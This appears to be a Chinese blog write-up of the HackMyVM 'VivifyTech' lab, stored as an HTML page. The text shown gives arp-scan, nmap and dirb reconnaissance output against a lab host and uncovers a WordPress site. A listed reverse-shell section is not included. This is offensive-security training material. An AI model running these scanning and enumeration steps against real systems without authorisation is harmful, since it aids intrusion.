@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HMV VivifyTech - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/vuln_hmv5/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="HMV VivifyTech">
+  <meta property="og:description" content="VivifyTech 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=VivifyTech
+日常扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.64.3 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.64.1 16:7f:ce:9b:a1:64 (Unknown: locally administered) 192.168.64.23 de:be:f3:07:14:ee (Unknown: locally administered) 2 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.867 seconds (137.12 hosts/sec). 2 responded ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.64.23 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:32 HKT Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 11:32 (0:00:03 remaining) Nmap scan report for 192.168.64.23 Host is up (0.00098s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u1 (protocol 2.0) | ssh-hostkey: | 256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA) |_ 256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-server-header: Apache/2.4.57 (Debian) |_http-title: Apache2 Debian Default Page: It works 3306/tcp open mysql MySQL (unauthorized) 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message&#34; | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message&#34; | HY000 | oracle-tns: | Invalid message-frame.&#34; |_ HY000 扫一下">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-18T15:41:46+08:00">
+    <meta property="article:modified_time" content="2025-02-18T15:41:46+08:00">
+    <meta property="article:tag" content="渗透">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="HMV VivifyTech">
+  <meta name="twitter:description" content="VivifyTech 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=VivifyTech
+日常扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.64.3 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.64.1 16:7f:ce:9b:a1:64 (Unknown: locally administered) 192.168.64.23 de:be:f3:07:14:ee (Unknown: locally administered) 2 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.867 seconds (137.12 hosts/sec). 2 responded ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.64.23 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:32 HKT Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 11:32 (0:00:03 remaining) Nmap scan report for 192.168.64.23 Host is up (0.00098s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u1 (protocol 2.0) | ssh-hostkey: | 256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA) |_ 256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-server-header: Apache/2.4.57 (Debian) |_http-title: Apache2 Debian Default Page: It works 3306/tcp open mysql MySQL (unauthorized) 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message&#34; | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message&#34; | HY000 | oracle-tns: | Invalid message-frame.&#34; |_ HY000 扫一下">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/vuln_hmv5/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/vuln_hmv4/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/hgame2025_crypto/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HMV VivifyTech",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/vuln_hmv5\/"
+        },"genre": "posts","keywords": "渗透","wordcount":  1960 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/vuln_hmv5\/","datePublished": "2025-02-18T15:41:46+08:00","dateModified": "2025-02-18T15:41:46+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HMV VivifyTech</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>靶场</a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-02-18">2025-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1960 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;<span id="/vuln_hmv5/" class="leancloud_visitors" data-flag-title="HMV VivifyTech">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#vivifytech">VivifyTech</a>
+      <ul>
+        <li><a href="#靶场链接">靶场链接</a></li>
+        <li><a href="#日常扫描">日常扫描</a></li>
+        <li><a href="#反弹shell">反弹shell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="vivifytech">VivifyTech</h2>
+<h3 id="靶场链接">靶场链接</h3>
+<p><a href="https://hackmyvm.eu/machines/machine.php?vm=VivifyTech" target="_blank" rel="noopener noreffer ">https://hackmyvm.eu/machines/machine.php?vm=VivifyTech</a></p>
+<h3 id="日常扫描">日常扫描</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo arp-scan -l
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.64.3
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+</span></span><span class="line"><span class="cl">192.168.64.1    16:7f:ce:9b:a1:64       (Unknown: locally administered)
+</span></span><span class="line"><span class="cl">192.168.64.23   de:be:f3:07:14:ee       (Unknown: locally administered)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2 packets received by filter, 0 packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: 256 hosts scanned in 1.867 seconds (137.12 hosts/sec). 2 responded
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ nmap -sV -sC -T4 -Pn -p- 192.168.64.23
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:32 HKT
+</span></span><span class="line"><span class="cl">Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span></span><span class="line"><span class="cl">Service scan Timing: About 50.00% done; ETC: 11:32 (0:00:03 remaining)
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.64.23
+</span></span><span class="line"><span class="cl">Host is up (0.00098s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65531 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.57 (Debian)
+</span></span><span class="line"><span class="cl">|_http-title: Apache2 Debian Default Page: It works
+</span></span><span class="line"><span class="cl">3306/tcp  open  mysql   MySQL (unauthorized)
+</span></span><span class="line"><span class="cl">33060/tcp open  mysqlx?
+</span></span><span class="line"><span class="cl">| fingerprint-strings: 
+</span></span><span class="line"><span class="cl">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+</span></span><span class="line"><span class="cl">|     Invalid message&#34;
+</span></span><span class="line"><span class="cl">|     HY000
+</span></span><span class="line"><span class="cl">|   LDAPBindReq: 
+</span></span><span class="line"><span class="cl">|     *Parse error unserializing protobuf message&#34;
+</span></span><span class="line"><span class="cl">|     HY000
+</span></span><span class="line"><span class="cl">|   oracle-tns: 
+</span></span><span class="line"><span class="cl">|     Invalid message-frame.&#34;
+</span></span><span class="line"><span class="cl">|_    HY000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>扫一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">dirb</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">-----------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">DIRB</span> <span class="n">v2</span><span class="o">.</span><span class="mi">22</span>    
+</span></span><span class="line"><span class="cl"><span class="n">By</span> <span class="n">The</span> <span class="n">Dark</span> <span class="n">Raver</span>
+</span></span><span class="line"><span class="cl"><span class="o">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">START_TIME</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">17</span> <span class="mi">11</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">06</span> <span class="mi">2025</span>
+</span></span><span class="line"><span class="cl"><span class="n">URL_BASE</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">WORDLIST_FILES</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">-----------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GENERATED</span> <span class="n">WORDS</span><span class="p">:</span> <span class="mi">4612</span>                                                          
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Scanning</span> <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">10701</span><span class="p">)</span>                        
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">403</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">278</span><span class="p">)</span>                       
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span>                                 
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">301</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span>                   
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span>                        
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span>                      
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">includes</span><span class="o">/</span>                     
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">xmlrpc</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">405</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">42</span><span class="p">)</span>                 
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl"><span class="o">----</span> <span class="n">Entering</span> <span class="n">directory</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span>          
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">css</span><span class="o">/</span>                    
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">images</span><span class="o">/</span>                 
+</span></span><span class="line"><span class="cl"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">includes</span><span class="o">/</span>               
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="n">SIZE</span><span class="p">:</span><span class="mi">0</span><span class="p">)</span>          
